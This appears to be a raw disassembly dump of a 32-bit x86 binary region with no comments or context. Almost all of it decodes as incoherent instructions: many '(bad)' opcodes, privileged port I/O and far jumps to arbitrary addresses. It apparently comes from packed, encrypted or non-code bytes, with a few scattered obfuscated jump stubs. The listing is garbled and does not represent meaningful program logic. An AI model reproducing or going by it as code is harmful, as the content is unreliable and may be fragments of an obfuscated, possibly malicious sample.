  41250c:	stos   DWORD PTR es:[edi],eax
  41250d:	fist   DWORD PTR [ebx-0x3e]
  412510:	xchg   DWORD PTR [edx],ebx
  412512:	sahf   
  412513:	sub    al,0xe8
  412515:	std    
  412516:	jne    0x4124a7
  412518:	in     al,0x92
  41251a:	push   cs
  41251b:	retf   0x7ee5
  41251e:	push   cs
  41251f:	inc    esp
  412520:	and    edx,DWORD PTR [esi+0xd]
  412523:	dec    ebx
  412524:	fmul   QWORD PTR [ebx-0x7ab8e71e]
  41252a:	pop    esp
  41252b:	popa   
  41252c:	sub    DWORD PTR [edi+eiz*8-0x7013759f],0xffffffbd
  412534:	in     eax,0x16
  412536:	jne    0x4124d4
  412538:	or     eax,DWORD PTR [edx+edx*4]
  41253b:	out    dx,al
  41253c:	leave  
  41253d:	pop    ecx
  41253e:	adc    DWORD PTR ds:0xeb833a3d,ecx
  412544:	add    ebp,DWORD PTR [edx-0x65ad322b]
  41254a:	shl    DWORD PTR [ebx+0x8],cl
  41254d:	repz xor ebx,0x1eec4e14
  412554:	dec    esi
  412555:	(bad)  
  412556:	data16 fwait
  412558:	add    ch,BYTE PTR es:[eax-0x2e]
  41255c:	es mov bh,0xa5
  41255f:	loope  0x4125ce
  412561:	pushf  
  412562:	pop    esi
  412563:	rcl    DWORD PTR [ebp+0x22],cl
  412566:	jnp    0x41254b
  412568:	cmp    DWORD PTR [ebx+0x6f311768],0xb5173d87
  412572:	mov    bl,0x80
  412574:	cmc    
  412575:	ret    
  412576:	aaa    
  412577:	cmovle ebx,DWORD PTR [eax-0x27d2f36c]
  41257e:	dec    edx
  41257f:	dec    eax
  412580:	pop    es
  412581:	jge    0x4125e0
  412583:	jbe    0x4125f1
  412585:	push   ebx
  412586:	outs   dx,DWORD PTR ds:[esi]
  412587:	(bad)  
  412589:	das    
  41258a:	rcl    BYTE PTR [eax+0x49],0x1d
  41258e:	jne    0x4125cc
  412590:	fbld   TBYTE PTR [eax+0x2ccd4dcf]
  412596:	pop    ebp
  412597:	or     DWORD PTR ds:0x436b3b36,edi
  41259d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41259e:	mov    fs,WORD PTR [ecx]
  4125a0:	jae    0x4125bb
  4125a2:	scas   eax,DWORD PTR es:[edi]
  4125a3:	or     DWORD PTR fs:[ebp-0x21],ebx
  4125a7:	xchg   edx,eax
  4125a8:	daa    
  4125a9:	cmp    BYTE PTR [edx-0x64c46b2c],cl
  4125af:	test   dl,cl
  4125b1:	dec    esp
  4125b2:	adc    eax,DWORD PTR [ecx-0x62]
  4125b5:	xchg   ebp,eax
  4125b6:	(bad)  
  4125b7:	stc    
  4125b8:	(bad)  
  4125b9:	jb     0x41253d
  4125bb:	shr    BYTE PTR [ecx+eax*8],0x65
  4125bf:	cld    
  4125c0:	or     bh,al
  4125c2:	inc    edi
  4125c3:	inc    edi
  4125c4:	and    BYTE PTR [ebx+0x58],bl
  4125c7:	jge    0x4125a1
  4125c9:	jmp    0x412626
  4125cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125cc:	cld    
  4125cd:	pop    esp
  4125ce:	jmp    0x36a5:0xb964dbcd
  4125d5:	addr16 in eax,0x70
  4125d8:	(bad)  
  4125d9:	shl    DWORD PTR [ecx+0x524ccfac],cl
  4125df:	xor    al,0x13
  4125e1:	mov    ebx,0xaad064a
  4125e6:	adc    ah,BYTE PTR [ecx]
  4125e8:	mov    cl,0x26
  4125ea:	mov    edx,0x97cff5bd
  4125ef:	loop   0x412574
  4125f1:	push   ds
  4125f2:	mov    WORD PTR [eax+0x9],fs
  4125f5:	push   edi
  4125f6:	push   ebp
  4125f7:	je     0x412607
  4125f9:	pushf  
  4125fa:	push   ss
  4125fb:	fistp  QWORD PTR [edi-0x3e]
  4125fe:	inc    ebx
  4125ff:	inc    ecx
  412600:	mov    edx,ds
  412602:	inc    eax
  412603:	call   0x375f:0xf3c254e3
  41260a:	push   ds
  41260b:	in     eax,dx
  41260c:	jg     0x4125e2
  41260e:	dec    ebx
  41260f:	and    DWORD PTR [ebx-0x64],0x22
  412613:	out    dx,eax
  412614:	cmp    edx,esp
  412616:	dec    edi
  412617:	(bad)  
  412618:	sbb    dl,BYTE PTR [esi-0x32823b53]
  41261e:	adc    DWORD PTR [ebx-0x64],ebp
  412621:	out    0x74,al
  412623:	lods   eax,DWORD PTR ds:[esi]
  412624:	pop    ebx
  412625:	and    eax,0x4c307ed3
  41262a:	clc    
  41262b:	mov    al,ds:0x95de6a42
  412630:	fst    QWORD PTR [edi]
  412632:	call   0x8d6a:0xf1d7d50e
  412639:	test   DWORD PTR [edi+eiz*8-0x9],esp
  41263d:	add    eax,0xef6d008a
  412642:	(bad)  
  412643:	mov    dh,0x13
  412645:	test   esi,ecx
  412647:	gs cs cmp ebp,ecx
  41264b:	cmp    ebp,edi
  41264d:	push   edx
  41264e:	mov    eax,0x2b503a93
  412653:	sub    DWORD PTR [ebx-0x2e3a1d8c],edi
  412659:	leave  
  41265a:	in     eax,dx
  41265b:	xor    edx,edx
  41265d:	sub    ah,ch
  41265f:	cmp    BYTE PTR ds:0xe10e7233,bl
  412665:	ins    BYTE PTR es:[edi],dx
  412666:	aas    
  412667:	add    ebp,DWORD PTR [eax]
  412669:	add    al,0x38
  41266b:	nop
  41266c:	push   es
  41266d:	jae    0x4126bf
  41266f:	mov    al,0xc
  412671:	jb     0x412689
  412673:	scas   al,BYTE PTR es:[edi]
  412674:	shl    BYTE PTR [eax-0x6],cl
  412677:	nop
  412678:	rcr    DWORD PTR [ecx+0x39],0x8
  41267c:	adc    eax,0xee5adbfd
  412681:	push   ds
  412682:	or     DWORD PTR [eax-0x5d0b8260],edi
  412688:	popa   
  412689:	imul   ebp,DWORD PTR [ecx+0x29],0xe0e69438
  412690:	ret    
  412691:	inc    esi
  412692:	push   0xffffffb5
  412694:	inc    ebx
  412695:	(bad)
  412698:	push   edx
  412699:	xlat   BYTE PTR ds:[ebx]
  41269a:	loope  0x4126f4
  41269c:	xor    ecx,DWORD PTR [ebx*1+0x3bf7ba55]
  4126a3:	mov    ebp,0x5fe12ee
  4126a8:	xchg   esi,eax
  4126a9:	pop    eax
  4126aa:	or     esp,DWORD PTR es:[edx-0x36]
  4126ae:	pop    eax
  4126af:	push   esi
  4126b0:	jmp    0x41265e
  4126b2:	jnp    0x4126a2
  4126b4:	cmp    al,BYTE PTR [esi+ebx*8+0x7ce6f564]
  4126bb:	call   0x4b5:0xfee727ef
  4126c2:	jecxz  0x4126e7
  4126c4:	push   edx
  4126c5:	push   ebp
  4126c6:	jns    0x41266b
  4126c8:	push   eax
  4126c9:	out    0x3,al
  4126cb:	leave  
  4126cc:	sahf   
  4126cd:	clc    
  4126ce:	sahf   
  4126cf:	dec    edx
  4126d0:	test   al,0x17
  4126d2:	retf   0x8126
  4126d5:	fs mov ebx,0x9867614e
  4126db:	xchg   ch,ah
  4126dd:	fs (bad) 
  4126df:	or     eax,0x3cf44682
  4126e4:	push   edx
  4126e5:	mov    esp,0xccd105f5
  4126ea:	fcomp  QWORD PTR [esi+0xa]
  4126ed:	cld    
  4126ee:	or     ch,BYTE PTR [ebx+ebx*8-0x54]
  4126f2:	in     al,dx
  4126f3:	cmp    DWORD PTR [ecx+0xd],ebx
  4126f6:	stc    
  4126f7:	xchg   esi,eax
  4126f8:	jae    0x4126dc
  4126fa:	or     bl,BYTE PTR ds:0xea1b564c
  412700:	mov    eax,0xac813923
  412705:	sbb    ebx,DWORD PTR [edi+0x7b3747ae]
  41270b:	cli    
  41270c:	push   esi
  41270d:	mov    ebx,0x6e62f4ac
  412712:	idiv   al
  412714:	and    edx,esi
  412716:	call   DWORD PTR [edx]
  412718:	cwde   
  412719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41271a:	push   ebp
  41271b:	pop    ds
  41271c:	test   eax,0x61452a34
  412721:	(bad)  
  412722:	bound  esi,QWORD PTR [edi]
  412724:	cli    
  412725:	stc    
  412726:	fld    TBYTE PTR [ecx+0x2db464fc]
  41272c:	pusha  
  41272d:	bound  eax,QWORD PTR [ebx-0x3d64b487]
  412733:	stos   BYTE PTR es:[edi],al
  412734:	fcmovnb st,st(7)
  412736:	inc    ebp
  412737:	hlt    
  412738:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  41273e:	mov    esp,0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	xchg   BYTE PTR ds:0x6caa6292,ch
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412761:	mov    ds:0xad93b962,al
  412766:	stos   DWORD PTR es:[edi],eax
  412767:	sbb    ecx,DWORD PTR [esi-0x1723c37d]
  41276d:	mov    bh,0x18
  41276f:	sub    eax,0x191ff43a
  412774:	loop   0x4127b0
  412776:	lods   eax,DWORD PTR ds:[esi]
  412777:	pop    eax
  412778:	pushf  
  412779:	test   eax,0xee7aa846
  41277e:	scas   eax,DWORD PTR es:[edi]
  41277f:	and    esp,DWORD PTR [esi+esi*2]
  412782:	jnp    0x412780
  412784:	call   0xdf0d0314
  412789:	mov    al,0xc6
  41278b:	outs   dx,DWORD PTR ds:[esi]
  41278c:	je     0x412739
  41278e:	pop    esp
  41278f:	jl     0x4127ed
  412791:	enter  0x59fa,0xc0
  412795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412796:	ja     0x412725
  412798:	and    BYTE PTR [eax+ebx*4-0x182e4498],0x2c
  4127a0:	mov    dl,0x33
  4127a2:	fwait
  4127a3:	out    0xb4,al
  4127a5:	div    esi
  4127a7:	jg     0x41278b
  4127a9:	fiadd  WORD PTR [edi+ebx*1-0x47]
  4127ad:	and    eax,0x12d40118
  4127b2:	outs   dx,DWORD PTR ds:[esi]
  4127b3:	xchg   ebx,eax
  4127b4:	inc    edx
  4127b5:	push   edi
  4127b6:	lock or al,0x30
  4127b9:	fwait
  4127ba:	jb     0x4127ad
  4127bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127bd:	dec    esp
  4127be:	sub    edi,DWORD PTR [ecx+0x8]
  4127c1:	repnz stc 
  4127c3:	jne    0x4127c7
  4127c5:	shl    DWORD PTR ds:0x1b73a458,cl
  4127cb:	stos   DWORD PTR es:[edi],eax
  4127cc:	adc    ebx,DWORD PTR [ecx-0x211f220a]
  4127d2:	aam    0x7d
  4127d4:	pop    ecx
  4127d5:	test   bh,ah
  4127d7:	and    ch,dl
  4127d9:	popa   
  4127da:	bound  ebx,QWORD PTR [edx]
  4127dc:	mov    al,ds:0x5e839ba2
  4127e1:	and    al,0xd4
  4127e3:	mov    dh,0xaa
  4127e5:	aaa    
  4127e6:	stos   BYTE PTR es:[edi],al
  4127e7:	xor    cl,ah
  4127e9:	sahf   
  4127ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127eb:	std    
  4127ec:	mov    ch,0x9b
  4127ee:	dec    ecx
  4127ef:	xor    esi,DWORD PTR [ebp+0x6b]
  4127f2:	sub    BYTE PTR [edx+0x28],ch
  4127f5:	pop    ebx
  4127f6:	pop    ecx
  4127f7:	out    dx,al
  4127f8:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127fa:	jmp    0x40dc4999
  4127ff:	hlt    
  412800:	retf   
  412801:	les    esi,FWORD PTR ds:0xb1141ffb
  412807:	and    esp,ecx
  412809:	sbb    dl,0x77
  41280c:	adc    ebp,eax
  41280e:	sbb    DWORD PTR [ebp+0x755c72ca],edx
  412814:	test   eax,0x8989871e
  412819:	nop
  41281a:	xchg   ebx,eax
  41281b:	lods   al,BYTE PTR ds:[esi]
  41281c:	push   esi
  41281d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41281e:	jno    0x412810
  412820:	mov    dl,0x9d
  412822:	cmc    
  412823:	push   cs
  412824:	xlat   BYTE PTR es:[ebx]
  412826:	mov    dl,0xcd
  412828:	daa    
  412829:	mov    dh,0x5d
  41282b:	adc    ebx,edx
  41282d:	cmp    al,0xa7
  41282f:	or     ch,ch
  412831:	or     DWORD PTR [ecx],edx
  412833:	dec    ebp
  412834:	cld    
  412835:	mov    al,0xf6
  412837:	(bad)  
  412838:	adc    edi,eax
  41283a:	jb     0x412861
  41283c:	shr    DWORD PTR [ebp-0x7],1
  41283f:	push   ds
  412840:	adc    DWORD PTR [edi-0x4ad1f616],esp
  412846:	xchg   esi,eax
  412847:	scas   al,BYTE PTR es:[edi]
  412848:	mov    ?,ecx
  41284a:	jl     0x41285c
  41284c:	jmp    0x9346:0x36917b5a
  412853:	mov    ebx,0xb9138df6
  412858:	scas   eax,DWORD PTR es:[edi]
  412859:	xor    ebp,DWORD PTR [ebp+0x4daebe11]
  41285f:	(bad)  
  412860:	int3   
  412861:	lds    ebx,FWORD PTR [eax+0x68]
  412864:	add    BYTE PTR [edx+0x7f2d5bf6],dh
  41286a:	(bad)  
  41286c:	sar    DWORD PTR ds:0x5453a1ce,1
  412872:	jb     0x412891
  412874:	scas   al,BYTE PTR es:[edi]
  412875:	add    cl,BYTE PTR [edx+0x6a]
  412878:	xchg   cl,dl
  41287a:	pushf  
  41287b:	nop
  41287c:	call   0xc14e2ad7
  412881:	jmp    0x59f17bdb
  412886:	add    cl,BYTE PTR [esi-0x56]
  412889:	sub    eax,0x48f516b9
  41288e:	jae    0x412893
  412890:	fcom   DWORD PTR [ecx+0x381e78ce]
  412896:	or     BYTE PTR [ebp-0x46],ah
  412899:	stos   DWORD PTR es:[edi],eax
  41289a:	mov    ecx,0x5c04dba9
  41289f:	or     eax,0x476fccdc
  4128a4:	arpl   WORD PTR [ebx+0x6480432b],cx
  4128aa:	es mov bl,0x50
  4128ad:	push   ds
  4128ae:	je     0x412842
  4128b0:	jnp    0x412892
  4128b2:	retf   0xe150
  4128b5:	aaa    
  4128b6:	or     DWORD PTR [ebp+ebx*2+0x46454c20],eax
  4128bd:	push   edi
  4128be:	cdq    
  4128bf:	popa   
  4128c0:	mov    ah,0xa6
  4128c2:	aam    0xa4
  4128c4:	sub    bl,bh
  4128c6:	ins    BYTE PTR es:[edi],dx
  4128c7:	xor    BYTE PTR [ebx*8+0x61155da6],cl
  4128ce:	fadd   DWORD PTR [edx-0x460b00c4]
  4128d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128d5:	or     eax,0xd96713d5
  4128da:	enter  0xb9bf,0xad
  4128de:	and    ecx,esi
  4128e0:	mov    ch,0x61
  4128e2:	push   esi
  4128e3:	inc    eax
  4128e4:	sbb    eax,0x760a474d
  4128e9:	dec    edx
  4128ea:	cmp    dl,BYTE PTR [ebx-0x7620e7f8]
  4128f0:	jne    0x412970
  4128f2:	sub    ebx,DWORD PTR [ebx+0x3e]
  4128f5:	xchg   BYTE PTR ds:0x5a1389d2,ch
  4128fb:	xchg   BYTE PTR [esi],dh
  4128fd:	lock sbb esp,edx
  412900:	dec    edx
  412901:	inc    ecx
  412902:	lods   eax,DWORD PTR ds:[esi]
  412903:	pusha  
  412904:	daa    
  412905:	add    ch,dl
  412907:	shl    DWORD PTR [eax],cl
  412909:	jl     0x4128a4
  41290b:	jmp    0xd7da5b3b
  412910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412911:	mov    edx,0xf31f088b
  412916:	lea    edi,[ecx+eiz*2]
  412919:	stos   BYTE PTR es:[edi],al
  41291a:	mov    DWORD PTR ss:[ecx-0x4],esp
  41291e:	(bad)  [esi+0xf]
  412921:	xchg   esi,eax
  412922:	pop    esi
  412923:	mov    ds:0xea7afaac,al
  412928:	xlat   BYTE PTR ds:[ebx]
  412929:	mov    bl,0xd3
  41292b:	iret   
  41292c:	dec    ecx
  41292d:	retf   0xc9a8
  412930:	push   ebp
  412931:	ins    BYTE PTR es:[edi],dx
  412932:	mov    ebx,0x75c48816
  412937:	ret    0xfde1
  41293a:	sub    eax,0xdc6ebf25
  41293f:	pop    ebx
  412940:	sbb    eax,0x3922d5fd
  412945:	loope  0x412965
  412947:	xchg   eax,esi
  412949:	es sbb al,dh
  41294c:	mov    DWORD PTR [ebp+0x1970121b],edi
  412952:	xchg   edx,eax
  412953:	outs   dx,BYTE PTR ds:[esi]
  412954:	pop    esp
  412955:	arpl   WORD PTR [eax+0x65],sp
  412958:	(bad)  
  412959:	sub    al,0x38
  41295b:	cld    
  41295c:	arpl   WORD PTR [edx-0x2a],bp
  41295f:	sbb    BYTE PTR [eax],al
  412961:	cmp    eax,0x6767528a
  412966:	dec    edx
  412967:	pop    edi
  412968:	inc    eax
  412969:	add    ebp,DWORD PTR [edx-0x55c076b9]
  41296f:	inc    esi
  412970:	jns    0x412976
  412972:	int3   
  412973:	into   
  412974:	arpl   WORD PTR [eax-0x74c741e4],ax
  41297a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41297b:	and    ah,bh
  41297d:	mov    edx,0x813c66b0
  412982:	sti    
  412983:	out    0xad,al
  412985:	or     DWORD PTR [eax-0x6d9bbbfc],esi
  41298b:	(bad)  
  41298c:	aaa    
  41298d:	int    0x86
  41298f:	retf   
  412990:	inc    ebp
  412991:	pop    esp
  412992:	jae    0x4129d1
  412994:	inc    ecx
  412995:	push   edi
  412996:	fcom   DWORD PTR [edi-0x21dc5153]
  41299c:	xor    eax,0xb745693e
  4129a1:	mov    dl,0xf0
  4129a3:	pop    edx
  4129a4:	stos   BYTE PTR es:[edi],al
  4129a5:	sbb    bl,al
  4129a7:	stos   DWORD PTR es:[edi],eax
  4129a8:	jge    0x41299e
  4129aa:	jns    0x4129db
  4129ac:	and    eax,0xa95fff2b
  4129b1:	int3   
  4129b2:	adc    dl,0xb3
  4129b5:	fcomp  QWORD PTR [ecx+edi*1]
  4129b8:	cwde   
  4129b9:	pop    ebx
  4129ba:	js     0x412947
  4129bc:	stos   DWORD PTR es:[edi],eax
  4129bd:	scas   eax,DWORD PTR es:[edi]
  4129be:	imul   esi,DWORD PTR [esi+0x29],0xffffff81
  4129c2:	sar    al,cl
  4129c4:	add    BYTE PTR [ecx+ecx*1-0x5137b111],bh
  4129cb:	mov    edx,DWORD PTR [ebp-0x18]
  4129ce:	xor    edx,eax
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a6f
  4129f1:	fsub   QWORD PTR [ecx]
  4129f3:	jne    0x412a0c
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a45
  4129fd:	sbb    al,0x9a
  4129ff:	mov    al,0xa3
  412a01:	outs   dx,DWORD PTR ds:[esi]
  412a02:	xor    cl,BYTE PTR [ebp-0x71]
  412a05:	test   eax,0x1d3eb141
  412a0a:	hlt    
  412a0b:	sbb    eax,0x79fafb4f
  412a10:	cwde   
  412a11:	add    ah,al
  412a13:	out    dx,eax
  412a14:	popa   
  412a15:	xchg   DWORD PTR [edi-0x6d1ab4e3],edx
  412a1b:	and    al,0x10
  412a1d:	retf   0x8344
  412a20:	ret    0x5da2
  412a23:	mov    ds:0xb69ede0c,eax
  412a28:	outs   dx,BYTE PTR ds:[esi]
  412a29:	pop    ss
  412a2a:	outs   dx,BYTE PTR ds:[esi]
  412a2b:	aad    0x23
  412a2d:	add    al,0x47
  412a2f:	jnp    0x4129b2
  412a31:	ins    DWORD PTR es:[edi],dx
  412a32:	dec    eax
  412a33:	int3   
  412a34:	push   esp
  412a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a36:	mov    ds:0xe741cf95,al
  412a3b:	lods   eax,DWORD PTR ds:[esi]
  412a3c:	ins    BYTE PTR es:[edi],dx
  412a3d:	sub    eax,0x601f2c80
  412a42:	xchg   edi,eax
  412a43:	dec    edx
  412a44:	(bad)  
  412a45:	xor    DWORD PTR [edi+0x3d],ecx
  412a48:	mov    ch,0x86
  412a4a:	jb     0x412a19
  412a4c:	loope  0x412a65
  412a4e:	xor    al,0x83
  412a50:	mov    edi,0x68d7528b
  412a55:	push   cs
  412a56:	pushf  
  412a57:	retf   
  412a58:	mov    ah,0xb5
  412a5a:	sub    ah,dh
  412a5c:	enter  0xcf9d,0x8a
  412a60:	push   gs
  412a62:	aaa    
  412a63:	daa    
  412a64:	push   ebp
  412a65:	ret    
  412a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a67:	adc    eax,0xc3fabc5b
  412a6c:	retf   0x7391
  412a6f:	or     DWORD PTR [ebp-0x23146b22],esp
  412a75:	(bad)  
  412a77:	and    al,0x4
  412a79:	sbb    al,0x92
  412a7b:	and    bl,BYTE PTR [esi]
  412a7d:	inc    ecx
  412a7e:	sar    edi,cl
  412a80:	or     DWORD PTR [esp+esi*4+0x50cb90a1],ebp
  412a87:	jmp    0x578:0x82d474a9
  412a8e:	icebp  
  412a8f:	stc    
  412a90:	in     eax,0x6d
  412a92:	sub    esi,esi
  412a94:	sbb    al,0xff
  412a96:	adc    eax,0x763bf7b0
  412a9b:	das    
  412a9c:	seta   BYTE PTR ds:0x6ae4c709
  412aa3:	pushf  
  412aa4:	jmp    0x412a9a
  412aa6:	imul   ebp,DWORD PTR [ebx],0x7128a966
  412aac:	or     BYTE PTR [ecx-0x2305bd4a],dh
  412ab2:	adc    eax,0x9ddc549d
  412ab7:	aaa    
  412ab8:	mov    ecx,0xfa3f3821
  412abd:	push   esp
  412abe:	or     esp,DWORD PTR [ecx+0x55]
  412ac1:	fs shl bl,1
  412ac4:	cwde   
  412ac5:	sub    al,0x91
  412ac7:	and    BYTE PTR [eax],dh
  412ac9:	sub    DWORD PTR [esi-0x32],eax
  412acc:	xor    al,0x84
  412ace:	aad    0x24
  412ad0:	(bad)  
  412ad1:	out    0x39,eax
  412ad3:	cmp    al,0x9a
  412ad5:	add    DWORD PTR [edx+0x20],eax
  412ad8:	call   DWORD PTR [esi+0x7]
  412adb:	lahf   
  412adc:	pop    es
  412add:	iret   
  412ade:	jnp    0x412b43
  412ae0:	outs   dx,DWORD PTR ds:[esi]
  412ae1:	outs   dx,DWORD PTR ds:[esi]
  412ae2:	xchg   esi,eax
  412ae3:	xchg   ecx,eax
  412ae4:	cmp    eax,0x42209302
  412ae9:	xor    DWORD PTR [eax+0x4747f814],esp
  412aef:	pop    ebp
  412af0:	push   ecx
  412af1:	cmp    al,0x21
  412af3:	data16 into 
  412af5:	dec    esi
  412af6:	mov    dh,0x39
  412af8:	add    cl,al
  412afa:	enter  0x27b3,0x59
  412afe:	out    0x97,al
  412b00:	into   
  412b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b02:	pop    ecx
  412b03:	out    0xc8,eax
  412b05:	dec    esi
  412b06:	sub    eax,0x5c666908
  412b0b:	pop    edx
  412b0c:	push   es
  412b0d:	sub    eax,0xa7894b4a
  412b12:	push   0x1a
  412b14:	leave  
  412b15:	imul   esi,DWORD PTR [ebp+0x219d829f],0xffffffab
  412b1c:	ror    BYTE PTR [esp+eax*1+0x765bd6f3],cl
  412b23:	nop
  412b24:	jnp    0x412aa6
  412b26:	xchg   ebx,eax
  412b27:	icebp  
  412b28:	dec    edi
  412b29:	pop    ebp
  412b2a:	and    ch,BYTE PTR [ebp-0x35bc0d25]
  412b30:	or     al,0x15
  412b32:	mov    bh,dl
  412b34:	imul   BYTE PTR [ebx+0x75122f37]
  412b3a:	pop    edi
  412b3b:	pop    ebp
  412b3c:	push   ss
  412b3d:	xlat   BYTE PTR ds:[ebx]
  412b3e:	test   eax,0xc841e3a7
  412b43:	inc    eax
  412b44:	mov    dh,0x1
  412b46:	cdq    
  412b47:	mov    eax,0x6bb05fe8
  412b4c:	cmp    al,0x9b
  412b4e:	pop    ecx
  412b4f:	outs   dx,BYTE PTR ds:[esi]
  412b50:	sbb    BYTE PTR [ebp+0xfea0c4d],bl
  412b56:	xchg   edi,eax
  412b57:	fadd   st(5),st
  412b59:	fldpi  
  412b5b:	cmpxchg BYTE PTR [edx+0xc1f3e2f],cl
  412b62:	fsubr  st,st(7)
  412b64:	xor    edi,DWORD PTR [ecx+ebx*2+0x119772bd]
  412b6b:	dec    esi
  412b6c:	push   edx
  412b6d:	xor    BYTE PTR [edx+0x0],bl
  412b70:	jo     0x412b47
  412b72:	lock adc ebp,DWORD PTR [edx-0x21eafff6]
  412b79:	or     eax,0x6d32374f
  412b7e:	gs out 0x39,eax
  412b81:	or     al,0x56
  412b83:	xchg   dl,cl
  412b85:	leave  
  412b86:	rcl    DWORD PTR [esi-0x56],1
  412b89:	adc    ecx,DWORD PTR [ebx]
  412b8b:	mov    ch,0x82
  412b8d:	push   cs
  412b8e:	or     esi,ebp
  412b90:	adc    dl,BYTE PTR [ebx]
  412b92:	mov    ds:0x67917c9,eax
  412b97:	jo     0x412b7c
  412b99:	mov    ebp,DWORD PTR [edi+0x46738576]
  412b9f:	dec    eax
  412ba0:	outs   dx,BYTE PTR ds:[esi]
  412ba1:	mov    ?,WORD PTR [eax+0x35]
  412ba4:	aad    0x89
  412ba6:	xor    ah,BYTE PTR [ebp+0x61]
  412ba9:	and    esi,0xcbcf8b8e
  412baf:	mov    edi,0x1d73460f
  412bb4:	cmp    BYTE PTR [edx],dh
  412bb6:	jnp    0x412b95
  412bb8:	mov    ds:0xf4637104,al
  412bbd:	mov    ds:0x478121ee,al
  412bc2:	daa    
  412bc3:	lahf   
  412bc4:	mov    cl,0x76
  412bc6:	call   0x94bc9fbb
  412bcb:	or     eax,0x84eb252f
  412bd0:	xor    eax,DWORD PTR [ebp+0x79]
  412bd3:	dec    edi
  412bd4:	(bad)  
  412bd5:	dec    esi
  412bd6:	jecxz  0x412be9
  412bd8:	ret    0x30
  412bdb:	mov    ebp,DWORD PTR [ecx]
  412bdd:	das    
  412bde:	add    al,al
  412be0:	xchg   BYTE PTR [edi-0x2f],bh
  412be3:	sub    ecx,DWORD PTR [ecx+0x2e98015e]
  412be9:	retf   
  412bea:	mov    dl,BYTE PTR [edi+0x526ab77]
  412bf0:	aad    0x26
  412bf2:	aam    0xdf
  412bf4:	xor    dl,cl
  412bf6:	and    eax,0x4f0e869b
  412bfb:	jo     0x412c46
  412bfd:	dec    ecx
  412bfe:	xchg   ebx,eax
  412bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c00:	sbb    DWORD PTR [eax],ebx
  412c02:	sub    DWORD PTR [eax+eiz*2+0x4c],esp
  412c06:	push   es
  412c07:	dec    edi
  412c08:	int    0x39
  412c0a:	cwde   
  412c0b:	popa   
  412c0c:	mov    gs,sp
  412c0f:	pop    ebx
  412c10:	retf   0x8170
  412c13:	adc    cl,BYTE PTR [esp+edx*4]
  412c16:	cmc    
  412c17:	loop   0x412bbc
  412c19:	rol    DWORD PTR [edi],cl
  412c1b:	mov    DWORD PTR [edi],ecx
  412c1d:	inc    edx
  412c1e:	cmp    eax,DWORD PTR [ebx]
  412c20:	cmc    
  412c21:	mov    al,0xcd
  412c23:	aam    0x71
  412c25:	lods   al,BYTE PTR ds:[esi]
  412c26:	push   esi
  412c27:	and    dl,BYTE PTR [edx-0x197d3655]
  412c2d:	outs   dx,DWORD PTR ds:[esi]
  412c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c2f:	and    BYTE PTR [ecx],0xfe
  412c32:	fadd   st(2),st
  412c34:	dec    ecx
  412c35:	adc    eax,DWORD PTR [eax-0xd]
  412c38:	cdq    
  412c39:	js     0x412c15
  412c3b:	xor    BYTE PTR [edi+0x2af724eb],bh
  412c41:	adc    BYTE PTR [esi-0x6f5abdbe],dl
  412c47:	test   al,0x2
  412c49:	in     eax,dx
  412c4a:	mov    ds:0x2b3bb40f,al
  412c4f:	push   edi
  412c50:	fistp  DWORD PTR [edx]
  412c52:	xchg   ebx,eax
  412c53:	stc    
  412c54:	mov    al,ds:0x93e3614a
  412c59:	dec    esi
  412c5a:	call   0x57268f5f
  412c5f:	and    edx,edx
  412c61:	les    ebp,FWORD PTR [edi+0x7478c618]
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [ebp-0xc],edi
  412c84:	xchg   ecx,eax
  412c85:	push   0xfffffffc
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cfb
  412c8f:	pop    ecx
  412c90:	pushf  
  412c91:	stos   BYTE PTR es:[edi],al
  412c92:	idiv   ebx
  412c94:	mov    esp,0x499cfecc
  412c99:	iret   
  412c9a:	in     al,dx
  412c9b:	rcr    BYTE PTR es:[ecx],cl
  412c9e:	add    eax,0xd8d7e51
  412ca3:	adc    esp,eax
  412ca5:	adc    bl,dl
  412ca7:	add    DWORD PTR [edi+ebp*1-0x32d584ec],ebx
  412cae:	mov    esp,edx
  412cb0:	ins    BYTE PTR es:[edi],dx
  412cb1:	mov    ds:0x5235a9bb,al
  412cb6:	je     0x412c84
  412cb8:	js     0x412cd8
